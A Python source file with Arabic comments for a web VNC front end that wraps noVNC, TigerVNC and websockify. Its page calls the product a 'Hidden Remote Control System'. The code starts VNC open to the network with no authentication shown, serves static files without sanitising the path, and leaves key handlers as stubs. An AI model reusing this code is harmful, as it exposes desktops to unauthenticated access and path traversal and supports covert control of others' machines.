#!/usr/bin/env python3
"""
TSM-SeniorOasisPanel Web VNC Integration
دمج noVNC و TigerVNC مع نظام TSM
"""

import os
import sys
import time
import threading
import subprocess
import socket
import struct
import json
import base64
import zlib
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import webbrowser
from PIL import Image, ImageGrab
import io

class TSMWebVNCHandler(BaseHTTPRequestHandler):
    """معالج HTTP لـ TSM Web VNC"""
    
    def __init__(self, vnc_server, *args, **kwargs):
        self.vnc_server = vnc_server
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        """معالجة طلبات GET"""
        try:
            parsed_path = urlparse(self.path)
            path = parsed_path.path
            
            if path == '/':
                self.serve_index()
            elif path == '/vnc.html':
                self.serve_vnc_page()
            elif path == '/vnc.js':
                self.serve_vnc_js()
            elif path == '/vnc.css':
                self.serve_vnc_css()
            elif path == '/websockify':
                self.handle_websocket()
            elif path.startswith('/static/'):
                self.serve_static_file(path)
            else:
                self.send_error(404, "File not found")
                
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Web VNC handler error: {e}")
            self.send_error(500, "Internal server error")
    
    def serve_index(self):
        """خدمة الصفحة الرئيسية"""
        html_content = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TSM-SeniorOasisPanel Web VNC</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            text-align: center;
        }
        .header {
            margin-bottom: 30px;
        }
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .vnc-container {
            background: rgba(255,255,255,0.1);
            border-radius: 15px;
            padding: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .controls {
            margin: 20px 0;
        }
        .btn {
            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
            color: white;
            border: none;
            padding: 12px 24px;
            margin: 5px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
        }
        .status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 10px;
            background: rgba(255,255,255,0.1);
        }
        .connected { background: rgba(46, 204, 113, 0.3); }
        .disconnected { background: rgba(231, 76, 60, 0.3); }
        #vnc-screen {
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 10px;
            max-width: 100%;
            height: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 TSM-SeniorOasisPanel</h1>
            <p>نظام التحكم عن بُعد المخفي | Hidden Remote Control System</p>
        </div>
        
        <div class="vnc-container">
            <div class="controls">
                <button class="btn" onclick="connectVNC()">🔗 الاتصال | Connect</button>
                <button class="btn" onclick="disconnectVNC()">❌ قطع الاتصال | Disconnect</button>
                <button class="btn" onclick="toggleFullscreen()">📺 ملء الشاشة | Fullscreen</button>
                <button class="btn" onclick="takeScreenshot()">📸 لقطة شاشة | Screenshot</button>
            </div>
            
            <div id="status" class="status disconnected">
                🔴 غير متصل | Disconnected
            </div>
            
            <div id="vnc-container">
                <canvas id="vnc-screen" width="800" height="600"></canvas>
            </div>
        </div>
    </div>
    
    <script>
        let vncClient = null;
        let isConnected = false;
        
        function connectVNC() {
            if (!isConnected) {
                // إنشاء اتصال VNC
                vncClient = new WebSocket('ws://localhost:6080/websockify');
                
                vncClient.onopen = function() {
                    isConnected = true;
                    updateStatus('🟢 متصل | Connected', 'connected');
                    console.log('TSM VNC Connected');
                };
                
                vncClient.onmessage = function(event) {
                    // معالجة بيانات VNC
                    handleVNCData(event.data);
                };
                
                vncClient.onclose = function() {
                    isConnected = false;
                    updateStatus('🔴 غير متصل | Disconnected', 'disconnected');
                    console.log('TSM VNC Disconnected');
                };
                
                vncClient.onerror = function(error) {
                    console.error('TSM VNC Error:', error);
                    updateStatus('❌ خطأ في الاتصال | Connection Error', 'disconnected');
                };
            }
        }
        
        function disconnectVNC() {
            if (vncClient && isConnected) {
                vncClient.close();
            }
        }
        
        function updateStatus(message, className) {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = 'status ' + className;
        }
        
        function handleVNCData(data) {
            // معالجة بيانات VNC وعرضها على Canvas
            const canvas = document.getElementById('vnc-screen');
            const ctx = canvas.getContext('2d');
            
            // هنا سيتم معالجة بيانات VNC وعرضها
            // This is where VNC data will be processed and displayed
        }
        
        function toggleFullscreen() {
            const container = document.getElementById('vnc-container');
            if (!document.fullscreenElement) {
                container.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }
        
        function takeScreenshot() {
            const canvas = document.getElementById('vnc-screen');
            const link = document.createElement('a');
            link.download = 'tsm-screenshot-' + Date.now() + '.png';
            link.href = canvas.toDataURL();
            link.click();
        }
        
        // بدء الاتصال التلقائي
        window.onload = function() {
            setTimeout(connectVNC, 1000);
        };
    </script>
</body>
</html>
"""
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))
    
    def serve_vnc_page(self):
        """خدمة صفحة VNC"""
        # استخدام noVNC HTML
        novnc_path = os.path.join('noVNC', 'vnc.html')
        if os.path.exists(novnc_path):
            with open(novnc_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # تخصيص noVNC لـ TSM
            content = content.replace(
                '<title>noVNC</title>',
                '<title>TSM-SeniorOasisPanel VNC</title>'
            )
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(content.encode('utf-8'))
        else:
            self.send_error(404, "noVNC not found")
    
    def serve_vnc_js(self):
        """خدمة ملف JavaScript لـ VNC"""
        novnc_js_path = os.path.join('noVNC', 'app', 'ui.js')
        if os.path.exists(novnc_js_path):
            with open(novnc_js_path, 'rb') as f:
                content = f.read()
            
            self.send_response(200)
            self.send_header('Content-type', 'application/javascript')
            self.end_headers()
            self.wfile.write(content)
        else:
            self.send_error(404, "noVNC JS not found")
    
    def serve_vnc_css(self):
        """خدمة ملف CSS لـ VNC"""
        novnc_css_path = os.path.join('noVNC', 'app', 'styles', 'novnc.css')
        if os.path.exists(novnc_css_path):
            with open(novnc_css_path, 'rb') as f:
                content = f.read()
            
            self.send_response(200)
            self.send_header('Content-type', 'text/css')
            self.end_headers()
            self.wfile.write(content)
        else:
            self.send_error(404, "noVNC CSS not found")
    
    def serve_static_file(self, path):
        """خدمة الملفات الثابتة"""
        file_path = os.path.join('noVNC', path[8:])  # إزالة '/static/'
        if os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                content = f.read()
            
            # تحديد نوع المحتوى
            if file_path.endswith('.js'):
                content_type = 'application/javascript'
            elif file_path.endswith('.css'):
                content_type = 'text/css'
            elif file_path.endswith('.png'):
                content_type = 'image/png'
            elif file_path.endswith('.jpg') or file_path.endswith('.jpeg'):
                content_type = 'image/jpeg'
            else:
                content_type = 'application/octet-stream'
            
            self.send_response(200)
            self.send_header('Content-type', content_type)
            self.end_headers()
            self.wfile.write(content)
        else:
            self.send_error(404, "File not found")
    
    def handle_websocket(self):
        """معالجة WebSocket للـ VNC"""
        # هذا سيتم تنفيذه مع websockify
        self.send_error(501, "WebSocket not implemented yet")
    
    def log_message(self, format, *args):
        """تسجيل رسائل HTTP"""
        print(f"TSM-SeniorOasisPanel: {format % args}")

class TSMWebVNCServer:
    """خادم Web VNC لـ TSM"""
    
    def __init__(self, host='localhost', port=8080, vnc_port=5900):
        self.host = host
        self.port = port
        self.vnc_port = vnc_port
        self.http_server = None
        self.vnc_server = None
        self.running = False
        
    def start_http_server(self):
        """بدء خادم HTTP"""
        try:
            def handler(*args, **kwargs):
                return TSMWebVNCHandler(self, *args, **kwargs)
            
            self.http_server = HTTPServer((self.host, self.port), handler)
            self.running = True
            
            print(f"TSM-SeniorOasisPanel: Web VNC Server started on http://{self.host}:{self.port}")
            
            # فتح المتصفح تلقائياً
            webbrowser.open(f'http://{self.host}:{self.port}')
            
            self.http_server.serve_forever()
            
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Web VNC Server error: {e}")
    
    def start_vnc_server(self):
        """بدء خادم VNC باستخدام TigerVNC"""
        try:
            # البحث عن TigerVNC
            tigervnc_path = os.path.join('tigervnc', 'unix', 'vncserver')
            
            if os.path.exists(tigervnc_path):
                # تشغيل TigerVNC server
                cmd = [tigervnc_path, f':{self.vnc_port - 5900}', '-localhost', 'no']
                subprocess.Popen(cmd)
                print(f"TSM-SeniorOasisPanel: TigerVNC Server started on port {self.vnc_port}")
            else:
                print("TSM-SeniorOasisPanel: TigerVNC not found, using built-in VNC")
                # استخدام VNC المدمج
                self.start_builtin_vnc()
                
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: VNC Server error: {e}")
    
    def start_builtin_vnc(self):
        """بدء VNC المدمج"""
        try:
            from TSM_EnhancedVNC import TSMEnhancedVNCServer
            
            self.vnc_server = TSMEnhancedVNCServer(host=self.host, port=self.vnc_port)
            vnc_thread = threading.Thread(target=self.vnc_server.start_server, daemon=True)
            vnc_thread.start()
            
            print(f"TSM-SeniorOasisPanel: Built-in VNC Server started on port {self.vnc_port}")
            
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Built-in VNC error: {e}")
    
    def start_websockify(self):
        """بدء websockify للربط بين WebSocket و VNC"""
        try:
            # البحث عن websockify في noVNC
            websockify_path = os.path.join('noVNC', 'utils', 'websockify', 'websockify.py')
            
            if os.path.exists(websockify_path):
                # تشغيل websockify
                cmd = [
                    sys.executable, websockify_path,
                    '6080', f'localhost:{self.vnc_port}',
                    '--web', 'noVNC'
                ]
                subprocess.Popen(cmd)
                print("TSM-SeniorOasisPanel: WebSockify started on port 6080")
            else:
                print("TSM-SeniorOasisPanel: WebSockify not found")
                
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: WebSockify error: {e}")
    
    def start(self):
        """بدء جميع الخدمات"""
        print("TSM-SeniorOasisPanel: Starting Web VNC System...")
        
        # بدء خادم VNC
        self.start_vnc_server()
        time.sleep(2)
        
        # بدء websockify
        self.start_websockify()
        time.sleep(2)
        
        # بدء خادم HTTP
        self.start_http_server()
    
    def stop(self):
        """إيقاف جميع الخدمات"""
        self.running = False
        if self.http_server:
            self.http_server.shutdown()
        print("TSM-SeniorOasisPanel: Web VNC System stopped")

class TSMWebVNCClient:
    """عميل Web VNC لـ TSM"""
    
    def __init__(self, server_host='localhost', server_port=8080):
        self.server_host = server_host
        self.server_port = server_port
        self.connected = False
        
    def connect(self):
        """الاتصال بخادم Web VNC"""
        try:
            url = f'http://{self.server_host}:{self.server_port}'
            webbrowser.open(url)
            print(f"TSM-SeniorOasisPanel: Web VNC Client opened: {url}")
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Web VNC Client error: {e}")
            return False

def main():
    """الدالة الرئيسية"""
    if len(sys.argv) < 2:
        print("Usage:")
        print("  Server: python TSM_WebVNC.py server [host] [port] [vnc_port]")
        print("  Client: python TSM_WebVNC.py client [host] [port]")
        sys.exit(1)
    
    mode = sys.argv[1].lower()
    
    if mode == 'server':
        host = sys.argv[2] if len(sys.argv) > 2 else 'localhost'
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 8080
        vnc_port = int(sys.argv[4]) if len(sys.argv) > 4 else 5900
        
        server = TSMWebVNCServer(host=host, port=port, vnc_port=vnc_port)
        try:
            server.start()
        except KeyboardInterrupt:
            server.stop()
    
    elif mode == 'client':
        host = sys.argv[2] if len(sys.argv) > 2 else 'localhost'
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 8080
        
        client = TSMWebVNCClient(server_host=host, server_port=port)
        client.connect()
    
    else:
        print("Invalid mode. Use 'server' or 'client'")
        sys.exit(1)

if __name__ == "__main__":
    main()
